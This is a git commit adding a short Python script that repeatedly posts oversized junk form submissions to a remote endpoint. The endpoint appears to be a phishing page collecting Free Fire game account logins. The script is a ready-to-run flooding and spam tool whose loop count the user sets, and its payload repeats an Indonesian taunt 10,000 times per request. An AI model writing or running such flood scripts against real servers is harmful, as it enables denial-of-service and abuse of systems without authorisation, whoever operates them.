25c3b7c957df15c6a42b311a19ec1714f47cf429
ridwaanhall <erbyl14@gmail.com>
2023-11-16 18:54:05 +0700

    part 11

---
+++ PART 11/part11.py
@@ -0,0 +1,27 @@
+import requests
+
+url = 'https://claimk.fgh.work.gd/encsic.php'
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+}
+
+loop_value = int(input("bar bar brp kali? : "))
+
+for i in range(1, loop_value+1):
+    email = str(i) +'''
+    |⚠️ kena spam wkwkw ⚠️|⚠️ bang udah bang ⚠️
+    |BY : -FRNDS 🖕🖕🖕'''*10000
+    
+    data = {
+        'email'     : email,
+        'password'  : 'Masih zaman tipu2 dek-dek, mo beli Rubicon kah?🗿',
+        'nick'      : 'Diamond Free Fire',
+        'playid'    : '666666666',
+        'level'     : '19',
+        'tier'      : 'Mythic Glory',
+        'rpt'       : 'Pernah',
+        'login'     : 'Facebook'
+    }
+    
+    response = requests.post(url, data=data, headers=headers)
+    print("bang udah bang", i)
